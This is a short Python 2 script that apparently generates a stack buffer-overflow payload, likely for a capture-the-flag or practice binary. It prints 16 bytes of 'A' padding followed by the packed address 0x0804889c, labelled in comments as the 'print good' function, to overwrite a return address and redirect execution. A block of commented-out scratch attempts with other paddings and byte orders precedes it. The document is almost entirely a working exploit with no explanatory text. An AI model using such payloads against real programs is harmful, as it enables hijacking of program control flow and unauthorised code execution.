#!/usr/bin/python

#----------------------junk_start-------------------------------
#print "\x73\x68\x65\x6b\x68\x61\x72\x00\x20\x20\x41\x2b"
#print ""address of print good 
#run $(python -c 'print "\x41" * 8')
#0x0804889c
#print "\x41"* 15 + format"9c"+"88"+"04"+"08"
#----------------------junk_end-------------------------------


from struct import pack
print "\x41"* 16 + pack("<I", 0x0804889c)
